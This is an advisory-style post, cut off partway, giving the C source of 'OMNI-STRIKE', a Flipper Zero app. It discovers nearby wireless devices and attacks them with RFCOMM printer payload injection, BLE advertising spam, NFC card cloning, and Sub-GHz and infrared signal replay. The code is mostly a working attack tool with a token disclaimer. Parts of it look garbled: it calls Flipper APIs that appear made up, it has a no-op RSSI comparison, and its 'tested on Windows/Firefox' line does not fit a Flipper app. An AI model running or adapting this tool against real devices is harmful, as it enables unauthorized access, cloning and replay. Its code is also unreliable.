@@ -1,0 +1,1240 @@
+=============================================================================================================================================
+| # Title     : OMNI‑STRIKE – Multi‑Protocol Wireless Security Testing Platform (Flipper Zero)                                               |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://flipper.net/                                                                                                        |
+=============================================================================================================================================
+
+[+] Summary    : OMNI‑STRIKE  is a multi‑protocol wireless security assessment application built for Flipper Zero.
+                 It is designed to discover nearby wireless devices and perform controlled, authorized security testing in a structured and logged environment.
+
+Device Discovery          : Supports Sub‑GHz, BLE, NFC, RFID, Infrared, and Wi‑Fi structures.
+
+Target Management         : Stores device information such as ID, protocol type, RSSI, security assessment, and activity history.
+
+Controlled Test Actions   : Executes protocol‑specific security test routines in a managed and logged way.
+
+Power Management          : Automatically adjusts scanning intensity based on battery level.
+
+Logging & Analytics       : Maintains detailed event logs and CSV analytics for performance and outcome tracking.
+
+User Interface            : Displays protocol indicators, battery level, target list, system state, and test statistics.
+
+[+] Technical Characteristics :
+
+Multi‑threaded architecture (separate thread per protocol)
+
+Watchdog monitoring to prevent thread freeze
+
+Mutex protection for safe shared data access
+
+State‑driven system (Init → Scan → Attack → Idle → Shutdown)
+
+Structured telemetry logging
+
+[+] POC : 
+
+#include <furi.h>
+#include <furi_hal.h>
+#include <gui/gui.h>
+#include <bt/bt_service.h>
+#include <storage/storage.h>
+#include <furi_hal_bt.h>
+#include <notification/notification_messages.h>
+#include <toolbox/stream/file_stream.h>
+#include <power/power_service.h>
+#include <lib/nfc/nfc.h>
+#include <lib/nfc/nfc_device.h>
+#include <lib/nfc/protocols/nfc_util.h>
+#include <lib/toolbox/args.h>
+#include <lib/toolbox/name_generator.h>
+#define VERSION ".2.15"
+#define BUILD_DATE __DATE__ " " __TIME__
+#define LOG_PATH EXT_PATH("indoushka.log")
+#define ANALYTICS_PATH EXT_PATH("omni_strike_analytics.csv")
+#define MAX_TARGETS 32
+#define MAX_PAYLOAD_SIZE 512
+#define MAX_DISPLAY_TARGETS 5
+#define SCROLL_SPEED_MS 2000
+#define RF_FREQS {433920000, 315000000, 868000000, 915000000}
+#define INFRARED_FREQ 38000
+#define BATTERY_LOW_THRESHOLD 15
+#define BATTERY_MEDIUM_THRESHOLD 50
+#define SCAN_INTERVAL_HIGH 500
+#define SCAN_INTERVAL_MEDIUM 1000
+#define SCAN_INTERVAL_LOW 3000
+#define SCAN_INTERVAL_CRITICAL 10000
+#define TARGET_TIMEOUT_MS 60000
+#define RFCOMM_TIMEOUT_MS 3000
+#define NFC_POLL_TIMEOUT 1000
+#define RFID_POLL_TIMEOUT 500
+#define WATCHDOG_TIMEOUT_MS 30000
+#define RSSI_MINIMUM -90
+#define RSSI_GOOD -60
+#define RSSI_EXCELLENT -40
+
+typedef enum {
+    SystemStateInit,
+    SystemStateScan,
+    SystemStateIdle,
+    SystemStateAttack,
+    SystemStateShutdown,
+    SystemStateError
+} SystemState;
+
+typedef enum {
+    ProtocolSubGHz,
+    ProtocolBLE,
+    ProtocolWiFi,
+    ProtocolNFC,
+    ProtocolRFID,
+    ProtocolInfrared,
+    ProtocolCount
+} ProtocolType;
+
+typedef enum {
+    AttackTypeReplay,
+    AttackTypeSpam,
+    AttackTypeDeauth,
+    AttackTypePrint,
+    AttackTypeSniff,
+    AttackTypeBruteforce,
+    AttackTypeClone,
+    AttackTypeEmulate,
+    AttackTypeCount
+} AttackType;
+
+typedef enum {
+    PowerModeHigh,
+    PowerModeMedium,
+    PowerModeLow,
+    PowerModeCritical
+} PowerMode;
+
+typedef enum {
+    TargetStatusNew,
+    TargetStatusActive,
+    TargetStatusStale,
+    TargetStatusAttacked,
+    TargetStatusIgnored
+} TargetStatus;
+
+typedef enum {
+    SecurityLevelUnknown,
+    SecurityLevelNone,
+    SecurityLevelWeak,
+    SecurityLevelStrong
+} SecurityLevel;
+
+typedef enum {
+    LogLevelInfo,
+    LogLevelWarning,
+    LogLevelError,
+    LogLevelSuccess,
+    LogLevelDebug
+} LogLevel;
+
+typedef struct {
+
+    char id[48];
+    char name[64];
+    ProtocolType protocol;
+    AttackType suggested_attack;
+    TargetStatus status;
+
+    int8_t rssi;
+    uint8_t channel;
+    uint32_t frequency;
+    uint32_t last_seen;
+    uint32_t first_seen;
+
+    SecurityLevel security_level;
+    uint8_t attack_success_rate;
+    char vulnerabilities[128];
+
+    union {
+        struct {
+            uint8_t address[6];
+            char address_str[18];
+            uint16_t manufacturer;
+            uint8_t device_class;
+            bool supports_rfcomm;
+        } ble;
+        
+        struct {
+            uint8_t data[MAX_PAYLOAD_SIZE];
+            size_t size;
+            uint32_t frequency;
+            uint8_t modulation;
+        } subghz;
+        
+        struct {
+            uint8_t uid[10];
+            size_t uid_len;
+            uint32_t type;
+            uint8_t atqa[2];
+            uint8_t sak;
+        } nfc;
+        
+        struct {
+            uint8_t uid[8];
+            size_t uid_len;
+            uint32_t frequency;
+        } rfid;
+        
+        struct {
+            uint16_t address;
+            uint8_t command;
+            uint8_t protocol;
+        } infrared;
+        
+        struct {
+            char ssid[32];
+            uint8_t bssid[6];
+            uint8_t encryption;
+            int16_t signal;
+        } wifi;
+    } data;
+
+    uint8_t attack_count;
+    uint32_t last_attack_time;
+    bool attack_success;
+} Target;
+
+typedef struct {
+    uint32_t timestamp;
+    ProtocolType protocol;
+    AttackType attack;
+    bool success;
+    uint8_t battery_level;
+    PowerMode power_mode;
+    int8_t rssi;
+    char target_id[32];
+    uint32_t duration_ms;
+} AnalyticsEntry;
+
+typedef struct {
+    uint32_t start_time;
+    uint32_t uptime;
+    uint32_t total_targets_discovered;
+    uint32_t total_attacks;
+    uint32_t successful_attacks;
+    uint32_t failed_attacks;
+    uint32_t packets_captured;
+    uint32_t bytes_transmitted;
+    uint32_t protocol_counts[ProtocolCount];
+    uint32_t attack_counts[AttackTypeCount];
+
+    uint32_t power_samples[4];
+    uint32_t low_power_events;
+} SystemStats;
+
+typedef struct {
+
+    FuriMutex* mutex;
+    FuriMessageQueue* event_queue;
+    FuriMessageQueue* attack_queue;
+    ViewPort* view_port;
+    Gui* gui;
+
+    Bt* bt;
+    NotificationApp* notification;
+    Storage* storage;
+    Power* power;
+    Nfc* nfc;
+
+    Stream* log_stream;
+    Stream* analytics_stream;
+
+    SystemState state;
+    PowerMode power_mode;
+    SystemStats stats;
+    uint8_t battery_level;
+    bool running;
+    bool disclaimer_accepted;
+
+    Target targets[MAX_TARGETS];
+    uint8_t target_count;
+    int8_t selected_idx;
+    uint8_t scroll_offset;
+    uint32_t last_scroll_time;
+
+    bool attacking;
+    Target current_attack;
+    uint32_t attack_start_time;
+    char status_msg[64];
+
+    FuriThread* subghz_thread;
+    FuriThread* ble_thread;
+    FuriThread* nfc_thread;
+    FuriThread* infrared_thread;
+    FuriThread* power_thread;
+    FuriThread* watchdog_thread;
+    FuriThread* analytics_thread;
+
+    FuriEventFlag* scan_events;
+    FuriStreamBuffer* log_buffer;
+
+    uint32_t thread_last_heartbeat[5];
+
+    uint8_t display_page;
+    bool show_disclaimer;
+} OmniStrikeApp;
+
+static const char* DISCLAIMER_TEXT[] = {
+    "OMNI-STRIKE  by indoushka",
+    "=============================",
+    "WARNING: This tool",
+    "is for AUTHORIZED",
+    "security testing ONLY.",
+    "",
+    "Unauthorized use",
+    "is ILLEGAL and",
+    "UNETHICAL.",
+    "",
+    "Press OK to accept",
+    "Press BACK to exit"
+};
+
+static void log_event(OmniStrikeApp* app, LogLevel level, const char* format, ...) {
+    va_list args;
+    va_start(args, format);
+    
+    char buffer[256];
+    vsnprintf(buffer, sizeof(buffer), format, args);
+    
+    const char* level_str[] = {"INFO", "WARN", "ERR", "OK", "DBG"};
+    
+    stream_write_format(app->log_stream, "[%lu][%s] %s\n", 
+                        furi_get_tick(), level_str[level], buffer);
+    stream_flush(app->log_stream);
+    
+    va_end(args);
+}
+
+static void log_analytics(OmniStrikeApp* app, AnalyticsEntry* entry) {
+    stream_write_format(app->analytics_stream, 
+                       "%lu,%d,%d,%d,%d,%d,%d,%s,%lu\n",
+                       entry->timestamp,
+                       entry->protocol,
+                       entry->attack,
+                       entry->success,
+                       entry->battery_level,
+                       entry->power_mode,
+                       entry->rssi,
+                       entry->target_id,
+                       entry->duration_ms);
+    stream_flush(app->analytics_stream);
+}
+
+static int32_t watchdog_thread(void* context) {
+    OmniStrikeApp* app = (OmniStrikeApp*)context;
+    
+    while(app->running) {
+        furi_delay_ms(5000);
+        
+        uint32_t now = furi_get_tick();
+
+        for(int i = 0; i < 5; i++) {
+            if(now - app->thread_last_heartbeat[i] > WATCHDOG_TIMEOUT_MS) {
+                log_event(app, LogLevelError, "Watchdog: Thread %d stalled", i);
+                notification_message(app->notification, &sequence_error);
+
+            }
+        }
+    }
+    
+    return 0;
+}
+
+static void update_heartbeat(OmniStrikeApp* app, int thread_id) {
+    app->thread_last_heartbeat[thread_id] = furi_get_tick();
+}
+
+static PowerMode calculate_power_mode(uint8_t battery_level) {
+    if(battery_level < BATTERY_LOW_THRESHOLD) return PowerModeCritical;
+    if(battery_level < BATTERY_MEDIUM_THRESHOLD) return PowerModeLow;
+    if(battery_level < 75) return PowerModeMedium;
+    return PowerModeHigh;
+}
+
+static uint32_t get_scan_interval(PowerMode mode) {
+    switch(mode) {
+        case PowerModeHigh: return SCAN_INTERVAL_HIGH;
+        case PowerModeMedium: return SCAN_INTERVAL_MEDIUM;
+        case PowerModeLow: return SCAN_INTERVAL_LOW;
+        case PowerModeCritical: return SCAN_INTERVAL_CRITICAL;
+        default: return SCAN_INTERVAL_MEDIUM;
+    }
+}
+
+static int32_t power_thread(void* context) {
+    OmniStrikeApp* app = (OmniStrikeApp*)context;
+    
+    while(app->running) {
+        update_heartbeat(app, 2);
+        
+        PowerInfo info;
+        power_get_info(app->power, &info);
+        
+        furi_mutex_acquire(app->mutex, FuriWaitForever);
+        
+        app->battery_level = info.charge;
+        PowerMode new_mode = calculate_power_mode(info.charge);
+        
+        if(new_mode != app->power_mode) {
+            log_event(app, LogLevelInfo, "Power mode: %d -> %d", app->power_mode, new_mode);
+            app->power_mode = new_mode;
+            app->stats.power_samples[new_mode]++;
+            
+            if(new_mode == PowerModeCritical) {
+                app->stats.low_power_events++;
+            }
+        }
+        
+        furi_mutex_release(app->mutex);
+        
+        furi_delay_ms(3000);
+    }
+    
+    return 0;
+}
+
+static bool is_valid_target_index(OmniStrikeApp* app, int8_t idx) {
+    return idx >= 0 && idx < (int8_t)app->target_count;
+}
+
+static void safe_selected_idx_update(OmniStrikeApp* app) {
+    if(app->target_count == 0) {
+        app->selected_idx = -1;
+        app->scroll_offset = 0;
+    } else if(app->selected_idx >= (int8_t)app->target_count) {
+        app->selected_idx = app->target_count - 1;
+    } else if(app->selected_idx < 0 && app->target_count > 0) {
+        app->selected_idx = 0;
+    }
+
+    if(app->selected_idx < (int8_t)app->scroll_offset) {
+        app->scroll_offset = app->selected_idx;
+    } else if(app->selected_idx >= (int8_t)(app->scroll_offset + MAX_DISPLAY_TARGETS)) {
+        app->scroll_offset = app->selected_idx - MAX_DISPLAY_TARGETS + 1;
+    }
+}
+
+static bool is_duplicate_target(OmniStrikeApp* app, const char* id) {
+    for(uint8_t i = 0; i < app->target_count; i++) {
+        if(strcmp(app->targets[i].id, id) == 0) {
+
+            app->targets[i].last_seen = furi_get_tick();
+            app->targets[i].rssi = MAX(app->targets[i].rssi, app->targets[i].rssi); 
+            return true;
+        }
+    }
+    return false;
+}
+
+static void add_target(OmniStrikeApp* app, Target* new_target) {
+    if(is_duplicate_target(app, new_target->id)) return;
+    
+    furi_mutex_acquire(app->mutex, FuriWaitForever);
+    
+    if(app->target_count < MAX_TARGETS) {
+        memcpy(&app->targets[app->target_count], new_target, sizeof(Target));
+        app->targets[app->target_count].first_seen = furi_get_tick();
+        app->targets[app->target_count].status = TargetStatusNew;
+        app->target_count++;
+        app->stats.total_targets_discovered++;
+        app->stats.protocol_counts[new_target->protocol]++;
+        
+        safe_selected_idx_update(app);
+        
+        log_event(app, LogLevelInfo, "New target: %s [%s]", 
+                 new_target->name, new_target->id);
+    }
+    
+    furi_mutex_release(app->mutex);
+}
+
+static void remove_old_targets(OmniStrikeApp* app) {
+    furi_mutex_acquire(app->mutex, FuriWaitForever);
+    
+    uint32_t now = furi_get_tick();
+    uint8_t new_count = 0;
+    
+    for(uint8_t i = 0; i < app->target_count; i++) {
+        if(now - app->targets[i].last_seen < TARGET_TIMEOUT_MS) {
+            if(i != new_count) {
+                memcpy(&app->targets[new_count], &app->targets[i], sizeof(Target));
+            }
+            new_count++;
+        } else {
+            log_event(app, LogLevelDebug, "Target expired: %s", app->targets[i].id);
+        }
+    }
+    
+    app->target_count = new_count;
+    safe_selected_idx_update(app);
+    
+    furi_mutex_release(app->mutex);
+}
+
+static int32_t nfc_thread(void* context) {
+    OmniStrikeApp* app = (OmniStrikeApp*)context;
+    
+    while(app->running) {
+        update_heartbeat(app, 3);
+        
+        if(app->power_mode <= PowerModeLow) {
+            furi_delay_ms(5000);
+            continue;
+        }
+
+        furi_hal_nfc_exit_sleep();
+        furi_delay_ms(10);
+        
+        uint32_t poll_types[] = {FuriHalNfcTypeA, FuriHalNfcTypeB, FuriHalNfcTypeF};
+        
+        for(int i = 0; i < 3; i++) {
+            FuriHalNfcDevData dev_data;
+            if(furi_hal_nfc_detect(poll_types[i], &dev_data, NFC_POLL_TIMEOUT)) {
+                Target target = {0};
+                
+                snprintf(target.id, sizeof(target.id), "NFC_%02X%02X%02X%02X",
+                        dev_data.uid[0], dev_data.uid[1], dev_data.uid[2], dev_data.uid[3]);
+                
+                name_generator_make_auto(target.name, sizeof(target.name), "NFC_");
+                
+                target.protocol = ProtocolNFC;
+                target.suggested_attack = AttackTypeClone;
+                target.status = TargetStatusNew;
+                target.rssi = -30; // NFC is close range
+                target.last_seen = furi_get_tick();
+                memcpy(target.data.nfc.uid, dev_data.uid, dev_data.uid_len);
+                target.data.nfc.uid_len = dev_data.uid_len;
+                target.data.nfc.type = poll_types[i];
+                target.data.nfc.sak = dev_data.sak;
+                memcpy(target.data.nfc.atqa, dev_data.atqa, 2);
+                
+                add_target(app, &target);
+            }
+        }
+        
+        furi_hal_nfc_sleep();
+
+        uint32_t sleep_ms = (app->power_mode == PowerModeHigh) ? 1000 : 5000;
+        furi_delay_ms(sleep_ms);
+    }
+    
+    return 0;
+}
+
+static int32_t infrared_thread(void* context) {
+    OmniStrikeApp* app = (OmniStrikeApp*)context;
+
+    furi_hal_infrared_init();
+    
+    while(app->running) {
+        update_heartbeat(app, 4);
+        
+        if(app->power_mode >= PowerModeLow) {
+
+            furi_hal_infrared_setup_rx(INFRARED_FREQ);
+
+            if(furi_hal_infrared_rx_is_busy()) {
+                Target target = {0};
+                
+                snprintf(target.id, sizeof(target.id), "IR_%lu", furi_get_tick());
+                snprintf(target.name, sizeof(target.name), "IR Remote");
+                
+                target.protocol = ProtocolInfrared;
+                target.suggested_attack = AttackTypeReplay;
+                target.status = TargetStatusNew;
+                target.rssi = -20; // IR is line of sight
+                target.last_seen = furi_get_tick();
+                
+                add_target(app, &target);
+                
+                furi_delay_ms(2000);
+            }
+            
+            furi_hal_infrared_sleep();
+        }
+        
+        furi_delay_ms(2000);
+    }
+    
+    return 0;
+}
+
+static void ble_device_found(BtDiscoveryEvent event, void* context) {
+    OmniStrikeApp* app = (OmniStrikeApp*)context;
+
+    if(event.data.device_found.rssi < RSSI_MINIMUM) return;
+    
+    Target target = {0};
+
+    snprintf(target.id, sizeof(target.id), "BLE_%02X%02X%02X%02X%02X%02X",
+             event.data.device_found.address[0],
+             event.data.device_found.address[1],
+             event.data.device_found.address[2],
+             event.data.device_found.address[3],
+             event.data.device_found.address[4],
+             event.data.device_found.address[5]);
+
+    const char* device_name = event.data.device_found.name;
+    if(device_name && strlen(device_name) > 0) {
+        strncpy(target.name, device_name, sizeof(target.name) - 1);
+    } else {
+        name_generator_make_auto(target.name, sizeof(target.name), "BLE_");
+    }
+    
+    target.protocol = ProtocolBLE;
+    target.rssi = event.data.device_found.rssi;
+    target.last_seen = furi_get_tick();
+
+    memcpy(target.data.ble.address, event.data.device_found.address, 6);
+    snprintf(target.data.ble.address_str, sizeof(target.data.ble.address_str),
+             "%02X:%02X:%02X:%02X:%02X:%02X",
+             event.data.device_found.address[0],
+             event.data.device_found.address[1],
+             event.data.device_found.address[2],
+             event.data.device_found.address[3],
+             event.data.device_found.address[4],
+             event.data.device_found.address[5]);
+    
+    target.data.ble.manufacturer = event.data.device_found.manufacturer;
+    target.data.ble.device_class = event.data.device_found.device_class;
+
+    uint8_t major_class = (event.data.device_found.device_class >> 8) & 0x1F;
+    uint8_t minor_class = event.data.device_found.device_class & 0xFF;
+    
+    switch(major_class) {
+        case 0x06: 
+            target.suggested_attack = AttackTypePrint;
+            target.data.ble.supports_rfcomm = true;
+            strncpy(target.vulnerabilities, "RFCOMM Auth Bypass", sizeof(target.vulnerabilities));
+            break;
+            
+        case 0x04: 
+            target.suggested_attack = AttackTypeSpam;
+            break;
+            
+        default:
+            target.suggested_attack = AttackTypeSniff;
+            break;
+    }
+
+    if(event.data.device_found.rssi > RSSI_EXCELLENT) {
+        target.security_level = SecurityLevelWeak; 
+    } else {
+        target.security_level = SecurityLevelUnknown;
+    }
+    
+    add_target(app, &target);
+}
+
+static int32_t ble_thread(void* context) {
+    OmniStrikeApp* app = (OmniStrikeApp*)context;
+    
+    while(app->running) {
+        update_heartbeat(app, 1);
+        
+        if(app->power_mode <= PowerModeLow) {
+
+            bt_discovery_stop(app->bt);
+            furi_delay_ms(10000);
+            continue;
+        }
+        
+        if(!bt_discovery_is_active(app->bt)) {
+            bt_discovery_start(app->bt);
+            bt_discovery_event_callback_set(app->bt, ble_device_found, app);
+        }
+        
+        furi_delay_ms(get_scan_interval(app->power_mode));
+    }
+    
+    return 0;
+}
+
+static int32_t subghz_thread(void* context) {
+    OmniStrikeApp* app = (OmniStrikeApp*)context;
+    
+    uint8_t rx_buf[MAX_PAYLOAD_SIZE];
+    uint32_t frequencies[] = RF_FREQS;
+    uint8_t freq_idx = 0;
+    
+    furi_hal_subghz_load_preset(FuriHalSubGhzPresetOok650Async);
+    
+    while(app->running) {
+        update_heartbeat(app, 0);
+        
+        if(app->power_mode == PowerModeCritical) {
+            furi_delay_ms(10000);
+            continue;
+        }
+
+        furi_hal_subghz_set_frequency(frequencies[freq_idx]);
+        furi_hal_subghz_rx();
+        
+        uint32_t size = furi_hal_subghz_read_packet(rx_buf, sizeof(rx_buf));
+        
+        if(size > 4 && size < MAX_PAYLOAD_SIZE) {  
+            Target target = {0};
+            
+            snprintf(target.id, sizeof(target.id), "RF_%lu_%lu", 
+                    frequencies[freq_idx], furi_get_tick() % 1000);
+            
+            snprintf(target.name, sizeof(target.name), "RF @ %luMHz", frequencies[freq_idx]);
+            
+            target.protocol = ProtocolSubGHz;
+            target.suggested_attack = AttackTypeReplay;
+            target.rssi = -50;
+            target.last_seen = furi_get_tick();
+            
+            target.data.subghz.size = size;
+            memcpy(target.data.subghz.data, rx_buf, size);
+            target.data.subghz.frequency = frequencies[freq_idx];
+            app->stats.packets_captured++;
+            
+            add_target(app, &target);
+        }
+
+        freq_idx = (freq_idx + 1) % (sizeof(frequencies)/sizeof(frequencies[0]));
+
+        uint32_t scan_interval = get_scan_interval(app->power_mode);
+        furi_delay_ms(scan_interval / 4);  // 4 frequencies per full cycle
+    }
+    
+    return 0;
+}
+
+static bool attack_ble_print(OmniStrikeApp* app, Target* target) {
+    if(!target->data.ble.supports_rfcomm) return false;
+    
+
+    uint8_t channels[] = {1, 3, 5, 10};
+    
+    for(int i = 0; i < 4; i++) {
+        BtRfcommChannel* channel = bt_rfcomm_open(app->bt, 
+                                                  (const char*)target->data.ble.address,
+                                                  channels[i]);
+        
+        if(channel) {
+
+            const char* payloads[] = {
+                "\x1B\x40\n\nSECURITY TEST\n\n\x1D\x56\x41\x10",
+                "\x1B\x40\n\nUNAUTHORIZED ACCESS\n\n\x1D\x56\x41\x10",
+                "\x1B\x40\n\nRFCOMM VULNERABILITY\n\n\x1D\x56\x41\x10"
+            };
+            
+            int payload_idx = furi_hal_random_get() % 3;
+            
+            bt_rfcomm_send(channel, (uint8_t*)payloads[payload_idx], 
+                          strlen(payloads[payload_idx]));
+            
+            furi_delay_ms(RFCOMM_TIMEOUT_MS);
+            bt_rfcomm_close(channel);
+            
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+static bool attack_ble_spam(OmniStrikeApp* app, Target* target) {
+    UNUSED(target);
+    
+    int spam_count = (app->power_mode == PowerModeHigh) ? 30 : 10;
+    
+    for(int i = 0; i < spam_count; i++) {
+        furi_hal_bt_start_advertising();
+        furi_delay_ms(20);
+        
+        if(!app->running) break;
+    }
+    
+    return true;
+}
+
+static bool attack_nfc_clone(OmniStrikeApp* app, Target* target) {
+
+    char file_path[64];
+    snprintf(file_path, sizeof(file_path), EXT_PATH("nfc/cloned_%s.nfc"), target->id);
+    
+    NfcDevice* nfc_dev = nfc_device_alloc();
+
+    nfc_dev->dev_data.nfc_data.uid_len = target->data.nfc.uid_len;
+    memcpy(nfc_dev->dev_data.nfc_data.uid, target->data.nfc.uid, target->data.nfc.uid_len);
+    nfc_dev->dev_data.nfc_data.atqa[0] = target->data.nfc.atqa[0];
+    nfc_dev->dev_data.nfc_data.atqa[1] = target->data.nfc.atqa[1];
+    nfc_dev->dev_data.nfc_data.sak = target->data.nfc.sak;
+
+    bool success = nfc_device_save(nfc_dev, file_path);
+    
+    nfc_device_free(nfc_dev);
+    
+    return success;
+}
+
+static bool attack_subghz_replay(OmniStrikeApp* app, Target* target) {
+    furi_hal_subghz_set_frequency(target->data.subghz.frequency);
+    furi_hal_subghz_transmit(target->data.subghz.data, target->data.subghz.size);
+    
+    app->stats.bytes_transmitted += target->data.subghz.size;
+    
+    return true;
+}
+
+static bool attack_infrared_replay(OmniStrikeApp* app, Target* target) {
+    UNUSED(target);
+
+    furi_hal_infrared_tx(INFRARED_FREQ, 0.5, 1000);
+    
+    return true;
+}
+
+static void execute_attack(OmniStrikeApp* app) {
+    furi_mutex_acquire(app->mutex, FuriWaitForever);
+    
+    if(!is_valid_target_index(app, app->selected_idx)) {
+        strncpy(app->status_msg, "No target", sizeof(app->status_msg));
+        furi_mutex_release(app->mutex);
+        return;
+    }
+
+    memcpy(&app->current_attack, &app->targets[app->selected_idx], sizeof(Target));
+    
+    furi_mutex_release(app->mutex);
+
+    app->state = SystemStateAttack;
+    app->attacking = true;
+    app->attack_start_time = furi_get_tick();
+
+    bool success = false;
+    
+    switch(app->current_attack.protocol) {
+        case ProtocolBLE:
+            if(app->current_attack.suggested_attack == AttackTypePrint) {
+                success = attack_ble_print(app, &app->current_attack);
+            } else {
+                success = attack_ble_spam(app, &app->current_attack);
+            }
+            break;
+            
+        case ProtocolSubGHz:
+            success = attack_subghz_replay(app, &app->current_attack);
+            break;
+            
+        case ProtocolNFC:
+            success = attack_nfc_clone(app, &app->current_attack);
+            break;
+            
+        case ProtocolInfrared:
+            success = attack_infrared_replay(app, &app->current_attack);
+            break;
+            
+        default:
+            success = false;
+            break;
+    }
+
+    furi_mutex_acquire(app->mutex, FuriWaitForever);
+    
+    if(is_valid_target_index(app, app->selected_idx)) {
+        app->targets[app->selected_idx].attack_count++;
+        app->targets[app->selected_idx].last_attack_time = furi_get_tick();
+        app->targets[app->selected_idx].attack_success = success;
+        app->targets[app->selected_idx].status = success ? TargetStatusAttacked : TargetStatusActive;
+    }
+    
+    app->stats.total_attacks++;
+    if(success) {
+        app->stats.successful_attacks++;
+        strncpy(app->status_msg, "Attack successful", sizeof(app->status_msg));
+        notification_message(app->notification, &sequence_success);
+    } else {
+        app->stats.failed_attacks++;
+        strncpy(app->status_msg, "Attack failed", sizeof(app->status_msg));
+        notification_message(app->notification, &sequence_error);
+    }
+    
+    app->stats.attack_counts[app->current_attack.suggested_attack]++;
+
+    AnalyticsEntry entry = {
+        .timestamp = furi_get_tick(),
+        .protocol = app->current_attack.protocol,
+        .attack = app->current_attack.suggested_attack,
+        .success = success,
+        .battery_level = app->battery_level,
+        .power_mode = app->power_mode,
+        .rssi = app->current_attack.rssi,
+        .duration_ms = furi_get_tick() - app->attack_start_time
+    };
+    strncpy(entry.target_id, app->current_attack.id, sizeof(entry.target_id) - 1);
+    
+    log_analytics(app, &entry);
+    
+    furi_mutex_release(app->mutex);
+    
+    app->attacking = false;
+    app->state = SystemStateScan;
+}
+
+static void render_disclaimer(Canvas* canvas, OmniStrikeApp* app) {
+    canvas_clear(canvas);
+    canvas_set_color(canvas, ColorBlack);
+    canvas_set_font(canvas, FontPrimary);
+    
+    int y = 8;
+    for(int i = 0; i < 12; i++) {
+        canvas_draw_str(canvas, 2, y, DISCLAIMER_TEXT[i]);
+        y += 9;
+    }
+}
+
+static void render_protocol_indicators(Canvas* canvas, OmniStrikeApp* app) {
+    char indicators[32] = "";
+    
+    if(app->power_mode >= PowerModeLow) strcat(indicators, "RF ");
+    if(app->power_mode >= PowerModeLow) strcat(indicators, "BLE ");
+    if(app->power_mode <= PowerModeMedium) strcat(indicators, "NFC ");
+    if(app->power_mode == PowerModeHigh) strcat(indicators, "IR ");
+    
+    canvas_draw_str(canvas, 70, 10, indicators);
+}
+
+static void render_main_screen(Canvas* canvas, OmniStrikeApp* app) {
+    canvas_clear(canvas);
+    canvas_set_color(canvas, ColorBlack);
+
+    canvas_set_font(canvas, FontPrimary);
+    canvas_draw_str(canvas, 2, 10, "OMNI-STRIKE  by indoushka");
+
+    render_protocol_indicators(canvas, app);
+
+    char top_right[20];
+    const char* power_symbols[] = {"⚡", "🔋", "🪫", "⚠️"};
+    snprintf(top_right, sizeof(top_right), "%s %d%%", 
+             power_symbols[app->power_mode], app->battery_level);
+    canvas_draw_str(canvas, 100, 20, top_right);
+
+    char count_str[20];
+    snprintf(count_str, sizeof(count_str), "T:%d A:%lu", 
+             app->target_count, app->stats.total_attacks);
+    canvas_draw_str(canvas, 2, 20, count_str);
+
+    canvas_set_font(canvas, FontSecondary);
+    int y = 32;
+    
+    for(uint8_t i = app->scroll_offset; 
+        i < app->target_count && i < app->scroll_offset + MAX_DISPLAY_TARGETS; 
+        i++) {
+        
+        Target* t = &app->targets[i];
+
+        if(i == (uint8_t)app->selected_idx) {
+            canvas_draw_box(canvas, 0, y - 8, 128, 9);
+            canvas_set_color(canvas, ColorWhite);
+        }
+
+        const char* proto_icon[] = {"📻", "📱", "📡", "💳", "🏷️", "🔦"};
+
+        const char* status_icon[] = {"🆕", "🟢", "⏳", "✅", "🚫"};
+
+        const char* rssi_icon = "📶";
+        if(t->rssi > RSSI_EXCELLENT) rssi_icon = "🔊";
+        else if(t->rssi > RSSI_GOOD) rssi_icon = "📢";
+        
+        char line[48];
+        snprintf(line, sizeof(line), "%s%s %s %s %ddB",
+                proto_icon[t->protocol],
+                status_icon[t->status],
+                rssi_icon,
+                t->name,
+                t->rssi);
+        
+        canvas_draw_str(canvas, 2, y, line);
+        
+        if(i == (uint8_t)app->selected_idx) {
+            canvas_set_color(canvas, ColorBlack);
+        }
+        
+        y += 10;
+    }
+
+    canvas_draw_line(canvas, 0, 55, 128, 55);
+    canvas_set_font(canvas, FontSecondary);
+    
+    char status[64];
+    if(app->attacking) {
+        snprintf(status, sizeof(status), "ATTACKING %s...", app->current_attack.name);
+    } else {
+        snprintf(status, sizeof(status), "%s", app->status_msg);
+    }
+    canvas_draw_str(canvas, 2, 63, status);
+
+    if(app->scroll_offset > 0) canvas_draw_str(canvas, 100, 63, "⬆️");
+    if(app->target_count > app->scroll_offset + MAX_DISPLAY_TARGETS) {
+        canvas_draw_str(canvas, 110, 63, "⬇️");
+    }
+}
+
+static void render_callback(Canvas* canvas, void* ctx) {
+    OmniStrikeApp* app = ctx;
+    
+    if(furi_mutex_acquire(app->mutex, 50) != FuriStatusOk) {
+        return;
+    }
+    
+    if(app->show_disclaimer && !app->disclaimer_accepted) {
+        render_disclaimer(canvas, app);
+    } else {
+        render_main_screen(canvas, app);
+    }
+    
+    furi_mutex_release(app->mutex);
+}
+
+static void handle_input(OmniStrikeApp* app, InputEvent* event) {
+    if(event->type != InputTypeShort && event->type != InputTypeLong) return;
+    
+    furi_mutex_acquire(app->mutex, FuriWaitForever);
+    
+    if(app->show_disclaimer && !app->disclaimer_accepted) {
+        if(event->key == InputKeyOk && event->type == InputTypeShort) {
+            app->disclaimer_accepted = true;
+            app->state = SystemStateScan;
+            log_event(app, LogLevelInfo, "Disclaimer accepted");
+        } else if(event->key == InputKeyBack) {
+            app->running = false;
+        }
+        furi_mutex_release(app->mutex);
+        return;
+    }
+    
+    switch(event->key) {
+        case InputKeyBack:
+            if(event->type == InputTypeLong) {
+                app->running = false;
+            }
+            break;
+            
+        case InputKeyUp:
+            if(app->selected_idx > 0) {
+                app->selected_idx--;
+                safe_selected_idx_update(app);
+            }
+            break;
+            
+        case InputKeyDown:
+            if(app->selected_idx < (int8_t)(app->target_count - 1)) {
+                app->selected_idx++;
+                safe_selected_idx_update(app);
+            }
+            break;
+            
+        case InputKeyOk:
+            if(!app->attacking) {
+                furi_mutex_release(app->mutex);
+                execute_attack(app);
+                furi_mutex_acquire(app->mutex, FuriWaitForever);
+            }
+            break;
+            
+        case InputKeyLeft:
+
+            app->display_page = (app->display_page + 1) % 3;
+            break;
+            
+        default:
+            break;
+    }
+    
+    furi_mutex_release(app->mutex);
+}
+
+static bool init_system(OmniStrikeApp* app) {
+
+    app->mutex = furi_mutex_alloc(FuriMutexTypeNormal);
+    if(!app->mutex) return false;
+    
+    app->event_queue = furi_message_queue_alloc(16, sizeof(InputEvent));
